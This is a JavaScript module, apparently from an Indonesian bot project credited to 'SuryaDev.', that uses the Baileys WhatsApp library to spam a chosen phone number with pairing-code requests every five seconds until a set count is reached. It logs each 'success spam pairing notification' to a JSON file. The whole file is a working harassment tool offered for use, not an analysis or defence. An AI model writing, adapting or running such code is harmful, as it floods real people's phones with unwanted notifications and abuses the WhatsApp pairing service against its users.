import chalk from 'chalk';
import fs from 'fs';
import pino from 'pino';
const {
default: makeWASocket,
useMultiFileAuthState
} = (await import('@adiwajshing/baileys')).default

let pathname = 'data.json';
let spamming = JSON.parse(fs.readFileSync(pathname))
let database = {};

function spamcode(input, amount) {
return new Promise(async (resolve) => {
let number = input.replace(/[^0-9]/g, '');
if ((number in database)) return;
let session = 'session';
let success = 1;
let failed = 1;
database[number] = setInterval(async function () {
const { state } = await useMultiFileAuthState(session);
const client = makeWASocket({
printQRInTerminal: false,
logger: pino({ level: 'silent' }), 
auth: state,
browser: ['Ubuntu', 'Chrome', '20.0.04']
});
if (!client.authState.creds.registered) {
try {
await new Promise(resolve => setTimeout(resolve, 3000));
let code = await client.requestPairingCode(number.trim())
let result = {
status: 200,
message: 'success spam pairing notification',
phone: number.trim(),
code: code?.match(/.{1,4}/g)?.join('-') || code,
success: success
}
console.log(chalk.black(chalk.cyan('Success :')), result)
spamming.push({ status: 200, message: 'success spam pairing notification', phone: number.trim() });
if (success >= amount) {
clearInterval(database[number]);
delete database[number];
fs.writeFileSync(pathname, JSON.stringify(spamming, null, 2))
console.log(`Success spamming pairing kode to ${number}`)
}
success++;
} catch (e) {
let result = {
status: 400,
message: String(e),
phone: number.trim(),
failed: failed
}
console.log(chalk.black(chalk.red('Failed :')), result)
spamming.push({ status: 400, message: String(e), phone: number.trim() });
failed++;
}
}
}, 5000) // menjalankan blok kode setiap 5 detik
resolve({
status: 200,
creator: 'SuryaDev.',
message: 'success spam pairing notification'
});
})
}

export { database, spamming };
export default spamcode;